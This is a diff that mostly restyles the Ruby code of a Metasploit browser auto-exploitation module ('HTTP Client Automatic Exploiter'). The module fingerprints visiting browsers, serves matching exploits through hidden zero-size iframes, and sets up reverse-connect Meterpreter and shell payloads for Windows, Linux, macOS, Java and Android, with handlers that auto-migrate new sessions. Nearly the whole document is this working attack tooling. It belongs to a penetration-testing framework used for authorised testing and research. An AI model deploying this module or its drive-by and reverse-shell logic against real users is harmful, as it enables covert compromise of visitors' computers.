@@ -15,51 +15,64 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'HTTP Client Automatic Exploiter',
-      'Description' => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'HTTP Client Automatic Exploiter',
+        'Description' => %q{
           This module has three actions.  The first (and the default)
-        is 'WebServer' which uses a combination of client-side and
-        server-side techniques to fingerprint HTTP clients and then
-        automatically exploit them.  Next is 'DefangedDetection' which
-        does only the fingerprinting part.  Lastly, 'list' simply
-        prints the names of all exploit modules that would be used by
-        the WebServer action given the current MATCH and EXCLUDE
-        options.
+          is 'WebServer' which uses a combination of client-side and
+          server-side techniques to fingerprint HTTP clients and then
+          automatically exploit them.  Next is 'DefangedDetection' which
+          does only the fingerprinting part.  Lastly, 'list' simply
+          prints the names of all exploit modules that would be used by
+          the WebServer action given the current MATCH and EXCLUDE
+          options.
 
-        Also adds a 'list' command which is the same as running with
-        ACTION=list.
-      },
-      'Author'      =>
-        [
+          Also adds a 'list' command which is the same as running with
+          ACTION=list.
+        },
+        'Author' => [
           # initial concept, integration and extension of Jerome
           # Athias' os_detect.js
           'egypt',
         ],
-      'License'     => BSD_LICENSE,
-      'Actions'     =>
-        [
-          [ 'WebServer', {
-            'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'
-          } ],
-          [ 'DefangedDetection', {
-            'Description' => 'Only perform detection, send no exploits'
-          } ],
-          [ 'list', {
-            'Description' => 'List the exploit modules that would be started'
-          } ]
+        'License' => BSD_LICENSE,
+        'Actions' => [
+          [
+            'WebServer', {
+              'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'
+            }
+          ],
+          [
+            'DefangedDetection', {
+              'Description' => 'Only perform detection, send no exploits'
+            }
+          ],
+          [
+            'list', {
+              'Description' => 'List the exploit modules that would be started'
+            }
+          ]
         ],
-      'PassiveActions' =>
-        [ 'WebServer', 'DefangedDetection' ],
-      'DefaultOptions' => {
+        'PassiveActions' => [ 'WebServer', 'DefangedDetection' ],
+        'DefaultOptions' => {
           # We know that most of these exploits will crash the browser, so
           # set the default to run migrate right away if possible.
           "InitialAutoRunScript" => "migrate -f",
         },
-      'DefaultAction'  => 'WebServer'))
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
-      OptAddressLocal.new('LHOST', [true,
+      OptAddressLocal.new('LHOST', [
+        true,
         'The IP address to use for reverse-connect payloads'
       ])
     ])
@@ -67,55 +80,70 @@ class MetasploitModule < Msf::Auxiliary
     register_advanced_options([
       OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", '']),
       OptBool.new('AutoSystemInfo', [true, "Automatically capture system information on initialization.", true]),
-      OptRegexp.new('MATCH', [false,
+      OptRegexp.new('MATCH', [
+        false,
         'Only attempt to use exploits whose name matches this regex'
       ]),
-      OptRegexp.new('EXCLUDE', [false,
+      OptRegexp.new('EXCLUDE', [
+        false,
         'Only attempt to use exploits whose name DOES NOT match this regex'
       ]),
-      OptBool.new('DEBUG_AUTOPWN', [false,
+      OptBool.new('DEBUG_AUTOPWN', [
+        false,
         'Do not obfuscate the javascript and print various bits of useful info to the browser',
         false
       ]),
-      OptPort.new('LPORT_WIN32', [false,
+      OptPort.new('LPORT_WIN32', [
+        false,
         'The port to use for Windows reverse-connect payloads', 3333
       ]),
-      OptString.new('PAYLOAD_WIN32', [false,
+      OptString.new('PAYLOAD_WIN32', [
+        false,
         'The payload to use for Windows reverse-connect payloads',
         'windows/meterpreter/reverse_tcp'
       ]),
-      OptPort.new('LPORT_LINUX', [false,
+      OptPort.new('LPORT_LINUX', [
+        false,
         'The port to use for Linux reverse-connect payloads', 4444
       ]),
-      OptString.new('PAYLOAD_LINUX', [false,
+      OptString.new('PAYLOAD_LINUX', [
+        false,
         'The payload to use for Linux reverse-connect payloads',
         'linux/meterpreter/reverse_tcp'
       ]),
-      OptPort.new('LPORT_MACOS', [false,
+      OptPort.new('LPORT_MACOS', [
+        false,
         'The port to use for Mac reverse-connect payloads', 5555
       ]),
-      OptString.new('PAYLOAD_MACOS', [false,
+      OptString.new('PAYLOAD_MACOS', [
+        false,
         'The payload to use for Mac reverse-connect payloads',
         'osx/meterpreter/reverse_tcp'
       ]),
-      OptPort.new('LPORT_GENERIC', [false,
+      OptPort.new('LPORT_GENERIC', [
+        false,
         'The port to use for generic reverse-connect payloads', 6666
       ]),
-      OptString.new('PAYLOAD_GENERIC', [false,
+      OptString.new('PAYLOAD_GENERIC', [
+        false,
         'The payload to use for generic reverse-connect payloads',
         'generic/shell_reverse_tcp'
       ]),
-      OptPort.new('LPORT_JAVA', [false,
+      OptPort.new('LPORT_JAVA', [
+        false,
         'The port to use for Java reverse-connect payloads', 7777
       ]),
-      OptString.new('PAYLOAD_JAVA', [false,
+      OptString.new('PAYLOAD_JAVA', [
+        false,
         'The payload to use for Java reverse-connect payloads',
         'java/meterpreter/reverse_tcp'
       ]),
-      OptPort.new('LPORT_ANDROID', [false,
+      OptPort.new('LPORT_ANDROID', [
+        false,
         'The port to use for Java reverse-connect payloads', 8888
       ]),
-      OptString.new('PAYLOAD_ANDROID', [false,
+      OptString.new('PAYLOAD_ANDROID', [
+        false,
         'The payload to use for Android reverse-connect payloads',
         'android/meterpreter/reverse_tcp'
       ])
@@ -127,7 +155,6 @@ class MetasploitModule < Msf::Auxiliary
     @current_victim = Hash.new
     @handler_job_ids = []
   end
-
 
   ##
   # CommandDispatcher stuff
@@ -172,12 +199,10 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def setup
     print_status("Setup")
 
     @init_js = ::Rex::Exploitation::Js::Detect.os(<<-ENDJS
-
       #{js_base64}
 
       function make_xhr() {
@@ -228,7 +253,7 @@ class MetasploitModule < Msf::Auxiliary
         report_and_get_exploits(detected_version);
       } // function bodyOnLoad
     ENDJS
-    )
+                                                 )
 
     if (datastore['DEBUG_AUTOPWN'])
       print_status("NOTE: Debug Mode; javascript will not be obfuscated")
@@ -239,13 +264,13 @@ class MetasploitModule < Msf::Auxiliary
       # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn
       #
 
-      #print_status("Obfuscating initial javascript #{pre}")
-      #@init_js.obfuscate
-      #print_status "Done in #{Time.now - pre} seconds"
+      # print_status("Obfuscating initial javascript #{pre}")
+      # @init_js.obfuscate
+      # print_status "Done in #{Time.now - pre} seconds"
     end
 
-    #@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
-    @init_html  = %Q|<html > <head > <title > Loading </title>\n|
+    # @init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
+    @init_html = %Q|<html > <head > <title > Loading </title>\n|
     @init_html << %Q|<script language="javascript" type="text/javascript">|
     @init_html << %Q|<!-- \n #{@init_js} //-->|
     @init_html << %Q|</script> </head> |
@@ -265,14 +290,14 @@ class MetasploitModule < Msf::Auxiliary
     # self-identifying payloads so we'd only need 1 LPORT for multiple
     # stagers.
     #
-    @win_lport  = datastore['LPORT_WIN32']
-    @win_payload  = datastore['PAYLOAD_WIN32']
-    @lin_lport  = datastore['LPORT_LINUX']
-    @lin_payload  = datastore['PAYLOAD_LINUX']
-    @osx_lport  = datastore['LPORT_MACOS']
-    @osx_payload  = datastore['PAYLOAD_MACOS']
-    @gen_lport  = datastore['LPORT_GENERIC']
-    @gen_payload  = datastore['PAYLOAD_GENERIC']
+    @win_lport = datastore['LPORT_WIN32']
+    @win_payload = datastore['PAYLOAD_WIN32']
+    @lin_lport = datastore['LPORT_LINUX']
+    @lin_payload = datastore['PAYLOAD_LINUX']
+    @osx_lport = datastore['LPORT_MACOS']
+    @osx_payload = datastore['PAYLOAD_MACOS']
+    @gen_lport = datastore['LPORT_GENERIC']
+    @gen_payload = datastore['PAYLOAD_GENERIC']
     @java_lport = datastore['LPORT_JAVA']
     @java_payload = datastore['PAYLOAD_JAVA']
     @android_lport = datastore['LPORT_ANDROID']
@@ -280,13 +305,11 @@ class MetasploitModule < Msf::Auxiliary
 
     minrank = framework.datastore['MinimumRank'] || 'manual'
     if not RankingName.values.include?(minrank)
-      print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
+      print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map { |r| r[1] }.join("|")})")
       wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
     end
     @minrank = RankingName.invert[minrank]
-
   end
-
 
   def init_exploit(name, mod = nil, targ = 0)
     if mod.nil?
@@ -366,11 +389,12 @@ class MetasploitModule < Msf::Auxiliary
     @exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
     @exploits[name].datastore['DisablePayloadHandler'] = true
     @exploits[name].exploit_simple(
-      'LocalInput'     => self.user_input,
-      'LocalOutput'    => self.user_output,
-      'Target'         => targ,
-      'Payload'        => payload,
-      'RunAsJob'       => true)
+      'LocalInput' => self.user_input,
+      'LocalOutput' => self.user_output,
+      'Target' => targ,
+      'Payload' => payload,
+      'RunAsJob' => true
+    )
 
     # It takes a little time for the resources to get set up, so sleep for
     # a bit to make sure the exploit is fully working.  Without this,
@@ -394,7 +418,6 @@ class MetasploitModule < Msf::Auxiliary
 
     return true
   end
-
 
   def start_exploit_modules()
     @lhost = (datastore['LHOST'] || "0.0.0.0")
@@ -421,9 +444,9 @@ class MetasploitModule < Msf::Auxiliary
         apo[:vuln_test] = ""
         apo[:ua_name] = HttpClients::IE
         conditions = []
-        if apo[:classid].kind_of?(Array)  # then it's many classids
+        if apo[:classid].kind_of?(Array) # then it's many classids
           apo[:classid].each { |clsid|
-            if apo[:method].kind_of?(Array)  # then it's many methods
+            if apo[:method].kind_of?(Array) # then it's many methods
               conditions += apo[:method].map { |m| "testAXO('#{clsid}', '#{m}')" }
             else
               conditions.push "testAXO('#{clsid}', '#{method}')"
@@ -441,8 +464,8 @@ class MetasploitModule < Msf::Auxiliary
       js_d_ver = @init_js.sym("detected_version")
       if apo[:ua_minver] and apo[:ua_maxver]
         ver_test =
-            "!#{@init_js.sym("ua_ver_lt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}') && " +
-            "!#{@init_js.sym("ua_ver_gt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')"
+          "!#{@init_js.sym("ua_ver_lt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}') && " +
+          "!#{@init_js.sym("ua_ver_gt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')"
       elsif apo[:ua_minver]
         ver_test = "!#{@init_js.sym("ua_ver_lt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}')\n"
       elsif apo[:ua_maxver]
@@ -453,7 +476,7 @@ class MetasploitModule < Msf::Auxiliary
 
       # if we built a version check above, add it to the normal test
       if ver_test
-        test =  "if (#{ver_test}) { "
+        test = "if (#{ver_test}) { "
         test << (apo[:vuln_test].empty? ? "is_vuln = true;" : apo[:vuln_test])
         test << "} else { is_vuln = false; }\n"
         apo[:vuln_test] = test
@@ -504,10 +527,11 @@ class MetasploitModule < Msf::Auxiliary
           multihandler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript']
         end
         multihandler.exploit_simple(
-          'LocalInput'     => self.user_input,
-          'LocalOutput'    => self.user_output,
-          'Payload'        => @payloads[lport],
-          'RunAsJob'       => true)
+          'LocalInput' => self.user_input,
+          'LocalOutput' => self.user_output,
+          'Payload' => @payloads[lport],
+          'RunAsJob' => true
+        )
         @handler_job_ids.push(multihandler.job_id)
       end
     end
@@ -525,8 +549,8 @@ class MetasploitModule < Msf::Auxiliary
     # This matters a lot less for noscript exploits since they basically
     # get thrown into a big pile of iframes that the browser will load
     # semi-concurrently.  Still, might as well.
-    @noscript_tests.each { |browser,tests|
-      tests.sort! {|a,b| b[:rank] <=> a[:rank]}
+    @noscript_tests.each { |browser, tests|
+      tests.sort! { |a, b| b[:rank] <=> a[:rank] }
     }
   end
 
@@ -612,7 +636,7 @@ class MetasploitModule < Msf::Auxiliary
       next unless client_matches_browser(client_info, browser)
 
       sploits.each do |s|
-        body << html_for_exploit( s, client_info )
+        body << html_for_exploit(s, client_info)
       end
       sploit_cnt += 1
     }
@@ -621,12 +645,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def build_noscript_response(cli, request)
-
     response = create_response()
     response['Expires'] = '0'
     response['Cache-Control'] = 'must-revalidate'
 
-    response.body  = "<html > <head > <title > Loading </title> </head> "
+    response.body = "<html > <head > <title > Loading </title> </head> "
     response.body << "<body> "
     response.body << "Please wait "
     response.body << build_noscript_html(cli, request)
@@ -650,8 +673,8 @@ class MetasploitModule < Msf::Auxiliary
     # that came back from javascript OS detection because NAT basically
     # makes it impossible to keep host/client mappings straight.
     client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
-    host_info   = client_info[:host]
-    #print_status("Client info: #{client_info.inspect}")
+    host_info = client_info[:host]
+    # print_status("Client info: #{client_info.inspect}")
 
     js = "var global_exploit_list = []\n";
     # If we didn't get a client from the database, then the detection
@@ -779,10 +802,10 @@ class MetasploitModule < Msf::Auxiliary
               test = "is_vuln = true"
             else
               # get rid of newlines and escape quotes
-              test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
+              test = s[:vuln_test].gsub("\n", '').gsub("'", "\\\\'")
             end
             # shouldn't be any in the resource, but just in case...
-            res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
+            res = exploit_resource(s[:name]).gsub("\n", '').gsub("'", "\\\\'")
 
             # Skip exploits that don't match the client's OS.
             if (host_info and host_info[:os_name] and s[:os_name])
@@ -810,7 +833,7 @@ class MetasploitModule < Msf::Auxiliary
           end
         else
           if s[:name] =~ %r|/java_|
-            res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
+            res = exploit_resource(s[:name]).gsub("\n", '').gsub("'", "\\\\'")
             js << "global_exploit_list[global_exploit_list.length] = {\n"
             js << "  'test':'is_vuln = navigator.javaEnabled()',\n"
             js << "  'resource':'#{res}'\n"
@@ -833,8 +856,8 @@ class MetasploitModule < Msf::Auxiliary
     # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn
     #
 
-    #js = ::Rex::Exploitation::JSObfu.new(js)
-    #js.obfuscate unless datastore["DEBUG_AUTOPWN"]
+    # js = ::Rex::Exploitation::JSObfu.new(js)
+    # js.obfuscate unless datastore["DEBUG_AUTOPWN"]
 
     response.body = "#{js}"
     print_status("Responding with #{sploit_cnt} exploits")
@@ -844,20 +867,18 @@ class MetasploitModule < Msf::Auxiliary
     return response
   end
 
-
   #
   # Determines whether a browser string matches an exploit module specification
   # Example: :os_name => ( 'Windows' | /Windows/ | ['Windows', 'Mac OS X'] )
   #
   def client_matches_module_spec?(client_str, module_spec)
-
     case module_spec
     when ::String
-      return !! (client_str == module_spec)
+      return !!(client_str == module_spec)
     when ::Regexp
-      return !! client_str.match(module_spec)
+      return !!client_str.match(module_spec)
     when ::Array
-      return !! exploit_spec.map{ |spec|
+      return !!exploit_spec.map { |spec|
         client_matches_module_spec?(client_str, spec)
       }.include?(true)
     end
@@ -900,7 +921,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   def client_matches_browser(client_info, browser)
     if client_info and browser and client_info[:ua_name]
-      if browser != "generic" and  client_info[:ua_name] != browser
+      if browser != "generic" and client_info[:ua_name] != browser
         vprint_status("Rejecting exploits for #{browser}")
         return false
       end
@@ -908,7 +929,6 @@ class MetasploitModule < Msf::Auxiliary
 
     true
   end
-
 
   # consider abstracting this out to a method (probably
   # with a different name) of Msf::Auxiliary::Report or
@@ -925,7 +945,7 @@ class MetasploitModule < Msf::Auxiliary
     ua_ver = nil
 
     data_offset = request.uri.index('sessid=')
-    #p request['User-Agent']
+    # p request['User-Agent']
     if (data_offset.nil? or -1 == data_offset)
       # then we didn't get a report back from our javascript
       # detection; make a best guess effort from information
@@ -945,14 +965,14 @@ class MetasploitModule < Msf::Auxiliary
         (os_name, os_vendor, os_flavor, os_device, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
 
         if framework.db.active
-          note_data = { }
-          note_data['os.product']   = os_name   if os_name != 'undefined'
-          note_data['os.vendor']    = os_vendor if os_vendor != 'undefined'
-          note_data['os.edition']   = os_flavor if os_flavor != 'undefined'
-          note_data['os.device']    = os_device if os_device != 'undefined'
-          note_data['os.version']   = os_sp     if os_sp != 'undefined'
-          note_data['os.language']  = os_lang   if os_lang != 'undefined'
-          note_data['os.arch']      = arch      if arch != 'undefined'
+          note_data = {}
+          note_data['os.product'] = os_name if os_name != 'undefined'
+          note_data['os.vendor'] = os_vendor if os_vendor != 'undefined'
+          note_data['os.edition'] = os_flavor if os_flavor != 'undefined'
+          note_data['os.device'] = os_device if os_device != 'undefined'
+          note_data['os.version'] = os_sp if os_sp != 'undefined'
+          note_data['os.language'] = os_lang if os_lang != 'undefined'
+          note_data['os.arch'] = arch if arch != 'undefined'
           note_data['os.certainty'] = '0.7'
           print_status("Reporting: #{note_data.inspect}")
 
@@ -964,21 +984,20 @@ class MetasploitModule < Msf::Auxiliary
           # ActiveRecord::RecordInvalid errors because 127.0.0.1 is
           # blacklisted in the Host validations.
           begin
-
             # Report a generic fingerprint.match note for the OS normalizer
             # Previously we reported a javascript_fingerprint type but this
             # was never used.
             report_note({
-              :host   => cli.peerhost,
-              :ntype  => 'fingerprint.match',
-              :data   => note_data,
+              :host => cli.peerhost,
+              :ntype => 'fingerprint.match',
+              :data => note_data,
               :update => :unique_data,
             })
             client_info = {
-              :host      => cli.peerhost,
+              :host => cli.peerhost,
               :ua_string => request['User-Agent'],
-              :ua_name   => ua_name,
-              :ua_ver    => ua_ver
+              :ua_name => ua_name,
+              :ua_ver => ua_ver
             }
             report_client(client_info)
           rescue ::Interrupt
@@ -1000,11 +1019,11 @@ class MetasploitModule < Msf::Auxiliary
     # Clean the cache
     rmq = []
     @targetcache.each_key do |addr|
-      if (Time.now.to_i > @targetcache[addr][:updated_at]+60)
+      if (Time.now.to_i > @targetcache[addr][:updated_at] + 60)
         rmq.push addr
       end
     end
-    rmq.each {|addr| @targetcache.delete(addr) }
+    rmq.each { |addr| @targetcache.delete(addr) }
 
     # Keep the attributes the same as if it were created in
     # the database.
@@ -1020,7 +1039,6 @@ class MetasploitModule < Msf::Auxiliary
     @targetcache[key][:host][:os_device] = os_device
     @targetcache[key][:host][:os_sp] = os_sp
     @targetcache[key][:host][:os_lang] = os_lang
-
   end
 
   # Override super#get_client to use a cache since the database is generally
@@ -1029,7 +1047,7 @@ class MetasploitModule < Msf::Auxiliary
   # broken (which seems to be all the time now).
   def get_client(opts)
     host = opts[:host]
-    return @targetcache[opts[:host]+opts[:ua_string]]
+    return @targetcache[opts[:host] + opts[:ua_string]]
   end
 
   def build_iframe(resource)
@@ -1038,14 +1056,14 @@ class MetasploitModule < Msf::Auxiliary
       ret << "<p>iframe #{resource}</p>"
     else
       ret << %Q|<iframe src="#{resource}" style="visibility:hidden" height="0" width="0" border="0"></iframe>|
-      #ret << %Q|<iframe src="#{resource}" ></iframe>|
+      # ret << %Q|<iframe src="#{resource}" ></iframe>|
     end
     return ret
   end
 
   def exploit_resource(name)
     if (@exploits[name] && @exploits[name].respond_to?("get_resource"))
-      #print_line("Returning #{@exploits[name].get_resource.inspect}, for #{name}")
+      # print_line("Returning #{@exploits[name].get_resource.inspect}, for #{name}")
       return @exploits[name].get_resource
     else
       print_error("Don't have an exploit by that name, returning 404#{name}.html")
@@ -1057,6 +1075,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['DEBUG_AUTOPWN']
       return "document.body.innerHTML += #{msg};"
     end
+
     return ""
   end
 
@@ -1065,6 +1084,7 @@ class MetasploitModule < Msf::Auxiliary
     @exploits.each_pair do |name, mod|
       # if the module died for some reason, we can't kill it
       next unless mod
+
       framework.jobs[mod.job_id.to_s].stop if framework.jobs[mod.job_id.to_s]
     end
     @handler_job_ids.each do |id|
